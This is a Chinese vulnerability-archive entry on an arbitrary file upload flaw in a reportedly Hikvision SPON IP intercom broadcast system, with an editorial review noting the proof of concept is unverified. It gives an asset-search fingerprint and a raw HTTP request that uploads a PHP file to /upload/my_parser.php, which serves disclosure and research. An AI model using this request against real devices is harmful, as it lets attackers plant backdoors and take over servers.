---
source: "wy876 漏洞文库"
id: "vw-35a21336e514ae8c470edbe8"
entity_id: "ve-35a21336e514ae8c470edbe8"
schema_version: "1"
title: "海康威视SPON IP网络对讲广播系统my_parser存在任意文件上传漏洞"
product: "标称Hikvision SPON IP广播系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie，upload/files目录，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86SPONIP%E7%BD%91%E7%BB%9C%E5%AF%B9%E8%AE%B2%E5%B9%BF%E6%92%AD%E7%B3%BB%E7%BB%9Fmy_parser%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dgm1h4giy6i2k3ys"
source_status: "recorded"
---

# 海康威视SPON IP网络对讲广播系统my_parser存在任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：标称Hikvision SPON IP广播系统
- 本文讨论：upload/my_parser.php文件上传
- 版本、权限与配置前提：无Cookie，upload/files目录，版本未知
- 资料类型：上传PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- Content-Length139243与短体严重不一致
- 内容1111111不能证明PHP执行/系统失陷
- 品牌/OEM无证据，html5资源宽泛指纹
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 型号固件、匿名/文件解析待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统my_parser存在任意文件上传漏洞，恶意攻击者可能会上传恶意的后门文件，使服务器失陷。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征


# 四、漏洞复现
```java
/upload/upload.html
```


```http
POST /upload/my_parser.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8dsf2vRYZDVPaW9m
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 139243

------WebKitFormBoundary8dsf2vRYZDVPaW9m
Content-Disposition: form-data; name="upload"; filename="tt.php"
Content-Type: image/jpeg

1111111
------WebKitFormBoundary8dsf2vRYZDVPaW9m--
```


上传文件位置

```java
/upload/files/tt.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dgm1h4giy6i2k3ys>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
